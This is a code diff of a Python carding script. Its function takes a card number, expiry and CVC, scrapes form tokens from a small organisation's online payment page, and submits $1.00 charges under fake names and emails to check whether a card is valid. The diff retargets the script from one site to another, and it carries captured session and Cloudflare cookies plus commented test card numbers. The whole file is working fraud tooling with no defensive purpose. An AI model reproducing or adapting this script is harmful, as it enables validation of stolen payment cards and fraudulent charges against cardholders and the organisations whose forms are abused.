@@ -60,15 +60,13 @@ def Tele(ccx):
     sess = generate_random_code()
     nr = random.randint(100000, 999999)
     lr = random.randint(1000, 9999)
-    d1 = random.randint(1, 4)
-    d2 = random.randint(1, 99)
     
     headers = {
-        'authority': 'gaschprinting.com',
+        'authority': 'www.bethpark.org',
         'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
         'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
         'cache-control': 'max-age=0',
-        #'if-modified-since': 'Mon, 27 Apr 2026 17:50:34 GMT',
+        #'if-modified-since': 'Tue, 28 Dec 2021 09:41:13 GMT',
         'referer': 'https://www.google.com/',
         'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
         'sec-ch-ua-mobile': '?1',
@@ -78,67 +76,41 @@ def Tele(ccx):
         'sec-fetch-site': 'cross-site',
         'sec-fetch-user': '?1',
         'upgrade-insecure-requests': '1',
-        'user-agent': user,
+        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
     }
     
-    response = session.get('https://gaschprinting.com/payment/', headers=headers)
+    response = session.get('https://www.bethpark.org/other-payment/', headers=headers)
     
     ajax = re.search(r"&amp;hash=(.*?)'", response.text).group(1)
     currency = re.search(r"data-currency='USD' value='(.*?)'", response.text).group(1)
-    state = re.search(r"name='state_17' value='(.*?)'", response.text).group(1)
+    state = re.search(r"name='state_1' value='(.*?)'", response.text).group(1)
     version = re.search(r'"version_hash":"(.*?)"', response.text).group(1)
-    #print(version)
-    
-    headers = {
-        'authority': 'gaschprinting.com',
-        'accept': '*/*',
-        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
-        #'content-type': 'multipart/form-data; boundary=----WebKitFormBoundarysZBh1P8FPB664qH2',
-        # 'cookie': '_ga_N1RGE1QFPY=GS2.1.s1777346171$o1$g0$t1777346171$j60$l0$h0; _ga_ZHE15SD08C=GS2.1.s1777346172$o1$g0$t1777346172$j60$l0$h0; _gid=GA1.2.353576958.1777346172; _ga_RWYLJZJJB6=GS2.1.s1777346172$o1$g0$t1777346172$j60$l0$h0; _ga=GA1.1.714877889.1777346172; __hstc=256288468.4c1899bee07bf938a0ed6db2bce1829c.1777346173495.1777346173495.1777346173495.1; hubspotutk=4c1899bee07bf938a0ed6db2bce1829c; __hssrc=1; __hssc=256288468.1.1777346173496; cookie_notice_accepted=false',
-        'origin': 'https://gaschprinting.com',
-        'referer': 'https://gaschprinting.com/payment/',
-        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
-        'sec-ch-ua-mobile': '?1',
-        'sec-ch-ua-platform': '"Android"',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'same-origin',
-        'user-agent': user,
-    }
-    
-    files = {
-        'action': (None, 'gf_zero_spam_token'),
-        'form_id': (None, '17'),
-    }
-    
-    response = session.post('https://gaschprinting.com/wp-admin/admin-ajax.php', #cookies=cookies, 
-    headers=headers, files=files)
-    
-    zero = response.json()['token']
-    #print(zero)
+    #print(ajax)
     
     cookies = {
-        '_ga_N1RGE1QFPY': 'GS2.1.s1777346171$o1$g0$t1777346171$j60$l0$h0',
-        '_ga_ZHE15SD08C': 'GS2.1.s1777346172$o1$g0$t1777346172$j60$l0$h0',
-        '_gid': 'GA1.2.353576958.1777346172',
-        '_ga_RWYLJZJJB6': 'GS2.1.s1777346172$o1$g0$t1777346172$j60$l0$h0',
-        '_ga': 'GA1.1.714877889.1777346172',
-        '__hstc': '256288468.4c1899bee07bf938a0ed6db2bce1829c.1777346173495.1777346173495.1777346173495.1',
-        'hubspotutk': '4c1899bee07bf938a0ed6db2bce1829c',
-        '__hssrc': '1',
-        '__hssc': '256288468.1.1777346173496',
-        'cookie_notice_accepted': 'false',
+        '_ga_S01GCQ9W83': 'GS2.1.s1777421530$o1$g0$t1777421530$j60$l0$h0',
+        '_ga': 'GA1.2.521965049.1777421531',
+        '_gid': 'GA1.2.1042330939.1777421531',
+        'wcsid': '0Hdy7nrRUtkTcgqH6S7Lx0I0dborzA5a',
+        'hblid': 'w7bzhsGG8rs3uWLk6S7Lx0I0Aaz05drb',
+        'cf_clearance': '0OsJydBMGQTadQoYqroYqJ3RyRTLDPgc6UcXnoNj7Fk-1777421532-1.2.1.1-tq6mIV35w3hp.GLLDrDiWCDcwrDOOo4lULpaUiWWcRrkqi6G9wWcyyBYKnNBET9o_ittJNOLOhyOQpYOhhnhI4yarCMEdQyKS.Mpn8JpyjdD2J35ZFdnWj7u0pIoXbUf8ZqD2Aoehrc5EXP1ZNJtoGfVrfwUpBv0BZQPQ6cf3o5wN_fY8z.dro09Op9vEJQjROdp.Aa1J9qIfcjaM__Hz5UiDA2HcbCiaRb9.IkM8F3IV7hTZG3EYiSPcuBIrQvU3Qe2wbsurIDIdoijLLQLz4sbO_Yx79O9hGvtARQT3UQuyKoFGesYkfHbUe_ZMUx__xFwSAbE1f0CrsDTgsb0PA',
+        '__cf_bm': 'uJKLK51mPJeTqGsbtQtRBGyfvvU8lxs_3JBVQ7TU.n0-1777421532.296741-1.0.1.1-Q54Ai4TkCYTFpcHqd1F93IYn2z80c8GqnFBisoDujPNr4w2OyzHwd499uYi_HlYASopSnQM03TKUqB0gdOcRNPKN885qmJscRYDDzwrL.NaksjJqF4yPL8BSPJgTJdwc',
+        '_okdetect': '%7B%22token%22%3A%2217774215317640%22%2C%22proto%22%3A%22about%3A%22%2C%22host%22%3A%22%22%7D',
+        'olfsk': 'olfsk23099488512443234',
+        '_okbk': 'cd4%3Dtrue%2Cvi5%3D0%2Cvi4%3D1777421532176%2Cvi3%3Dactive%2Cvi2%3Dfalse%2Cvi1%3Dfalse%2Ccd8%3Dchat%2Ccd6%3D0%2Ccd5%3Daway%2Ccd3%3Dfalse%2Ccd2%3D0%2Ccd1%3D0%2C',
+        '_ok': '3825-592-10-7286',
+        '_oklv': '1777421591402%2C0Hdy7nrRUtkTcgqH6S7Lx0I0dborzA5a',
     }
     
     headers = {
-        'authority': 'gaschprinting.com',
+        'authority': 'www.bethpark.org',
         'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
         'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
         'cache-control': 'max-age=0',
-        #'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryJcha4meBsJYFnYRC',
-        # 'cookie': '_ga_N1RGE1QFPY=GS2.1.s1777346171$o1$g0$t1777346171$j60$l0$h0; _ga_ZHE15SD08C=GS2.1.s1777346172$o1$g0$t1777346172$j60$l0$h0; _gid=GA1.2.353576958.1777346172; _ga_RWYLJZJJB6=GS2.1.s1777346172$o1$g0$t1777346172$j60$l0$h0; _ga=GA1.1.714877889.1777346172; __hstc=256288468.4c1899bee07bf938a0ed6db2bce1829c.1777346173495.1777346173495.1777346173495.1; hubspotutk=4c1899bee07bf938a0ed6db2bce1829c; __hssrc=1; __hssc=256288468.1.1777346173496; cookie_notice_accepted=false',
-        'origin': 'https://gaschprinting.com',
-        'referer': 'https://gaschprinting.com/payment/',
+        #'content-type': 'multipart/form-data; boundary=----WebKitFormBoundary9znuuEWrFNbdagNn',
+        # 'cookie': '_ga_S01GCQ9W83=GS2.1.s1777421530$o1$g0$t1777421530$j60$l0$h0; _ga=GA1.2.521965049.1777421531; _gid=GA1.2.1042330939.1777421531; wcsid=0Hdy7nrRUtkTcgqH6S7Lx0I0dborzA5a; hblid=w7bzhsGG8rs3uWLk6S7Lx0I0Aaz05drb; cf_clearance=0OsJydBMGQTadQoYqroYqJ3RyRTLDPgc6UcXnoNj7Fk-1777421532-1.2.1.1-tq6mIV35w3hp.GLLDrDiWCDcwrDOOo4lULpaUiWWcRrkqi6G9wWcyyBYKnNBET9o_ittJNOLOhyOQpYOhhnhI4yarCMEdQyKS.Mpn8JpyjdD2J35ZFdnWj7u0pIoXbUf8ZqD2Aoehrc5EXP1ZNJtoGfVrfwUpBv0BZQPQ6cf3o5wN_fY8z.dro09Op9vEJQjROdp.Aa1J9qIfcjaM__Hz5UiDA2HcbCiaRb9.IkM8F3IV7hTZG3EYiSPcuBIrQvU3Qe2wbsurIDIdoijLLQLz4sbO_Yx79O9hGvtARQT3UQuyKoFGesYkfHbUe_ZMUx__xFwSAbE1f0CrsDTgsb0PA; __cf_bm=uJKLK51mPJeTqGsbtQtRBGyfvvU8lxs_3JBVQ7TU.n0-1777421532.296741-1.0.1.1-Q54Ai4TkCYTFpcHqd1F93IYn2z80c8GqnFBisoDujPNr4w2OyzHwd499uYi_HlYASopSnQM03TKUqB0gdOcRNPKN885qmJscRYDDzwrL.NaksjJqF4yPL8BSPJgTJdwc; _okdetect=%7B%22token%22%3A%2217774215317640%22%2C%22proto%22%3A%22about%3A%22%2C%22host%22%3A%22%22%7D; olfsk=olfsk23099488512443234; _okbk=cd4%3Dtrue%2Cvi5%3D0%2Cvi4%3D1777421532176%2Cvi3%3Dactive%2Cvi2%3Dfalse%2Cvi1%3Dfalse%2Ccd8%3Dchat%2Ccd6%3D0%2Ccd5%3Daway%2Ccd3%3Dfalse%2Ccd2%3D0%2Ccd1%3D0%2C; _ok=3825-592-10-7286; _oklv=1777421591402%2C0Hdy7nrRUtkTcgqH6S7Lx0I0dborzA5a',
+        'origin': 'https://www.bethpark.org',
+        'referer': 'https://www.bethpark.org/other-payment/',
         'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
         'sec-ch-ua-mobile': '?1',
         'sec-ch-ua-platform': '"Android"',
@@ -147,50 +119,48 @@ def Tele(ccx):
         'sec-fetch-site': 'same-origin',
         'sec-fetch-user': '?1',
         'upgrade-insecure-requests': '1',
-        'user-agent': user,
+        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
     }
     
     files = [
+        ('input_11', (None, '')),
         ('input_1.3', (None, f'{first_name}')),
         ('input_1.6', (None, f'{last_name}')),
-        ('input_5', (None, '')),
-        ('input_9', (None, f'430300{lr}')),
-        ('input_8', (None, '1')),
-        ('input_2', (None, '$1.00')),
-        ('input_3', (None, f'yellhtetgaung{nr}@gmail.com')),
+        ('input_2', (None, f'yellhtetgaung{nr}@gmail.com')),
+        ('input_3', (None, f'(430) 300-{lr}')),
         ('input_4', (None, '')),
+        ('input_5', (None, '1')),
+        ('input_6', (None, '$1.00')),
         ('input_7', (None, '$1.00')),
-        ('input_6.1', (None, f'{n}')),
-        ('input_6.2[]', (None, f'{mm}')),
-        ('input_6.2[]', (None, f'20{yy}')),
-        ('input_6.3', (None, f'{cvc}')),
-        ('input_6.5', (None, f'{first_name} {last_name}')),
-        ('gform_ajax', (None, f'form_id=17&title=&description=&tabindex=0&theme=gravity-theme&styles=[]&hash={ajax}')),
+        ('input_8.1', (None, f'{n}')),
+        ('input_8.2[]', (None, f'{mm}')),
+        ('input_8.2[]', (None, f'20{yy}')),
+        ('input_8.3', (None, f'{cvc}')),
+        ('input_8.5', (None, f'{first_name} {last_name}')),
+        ('gform_ajax', (None, f'form_id=1&title=&description=&tabindex=0&theme=gravity-theme&styles=[]&hash={ajax}')),
         ('gform_submission_method', (None, 'iframe')),
         ('gform_theme', (None, 'gravity-theme')),
         ('gform_style_settings', (None, '[]')),
-        ('is_submit_17', (None, '1')),
-        ('gform_submit', (None, '17')),
+        ('is_submit_1', (None, '1')),
+        ('gform_submit', (None, '1')),
         ('gform_currency', (None, f'{currency}')),
         ('gform_unique_id', (None, '')),
-        ('state_17', (None, f'{state}')),
-        ('gform_target_page_number_17', (None, '0')),
-        ('gform_source_page_number_17', (None, '1')),
+        ('state_1', (None, f'{state}')),
+        ('gform_target_page_number_1', (None, '0')),
+        ('gform_source_page_number_1', (None, '1')),
         ('gform_field_values', (None, '')),
         ('version_hash', (None, f'{version}')),
-        ('gform_submission_speeds', (None, '{"pages":{"1":[87493]}}')),
-        ('gf_zero_spam_token', (None, f'{zero}')),
+        ('gform_submission_speeds', (None, '{"pages":{"1":[23340]}}')),
     ]
     
-    response = session.post('https://gaschprinting.com/payment/', #cookies=cookies, 
+    response = session.post('https://www.bethpark.org/other-payment/', #cookies=cookies, 
     headers=headers, files=files)
     
     try:
         result = re.search(r"class='gfield_description validation_message gfield_validation_message'><!-- (.*?)<\/div><\/fieldset>", response.text).group(1)
     except:
-        result = re.search(r"class='gform_confirmation_message_17 gform_confirmation_message'>(.*?)<\/div><\/div>", response.text).group(1)
-
+        result = re.search(r"class='gform_confirmation_message_1 gform_confirmation_message'>(.*?)<\/div><\/div>", response.text).group(1)
     return result
     
-#test_card = "5132848403801477|04|2026|399"
+#test_card = "5164998784300556|06|2029|155"
 #print(Tele(test_card))
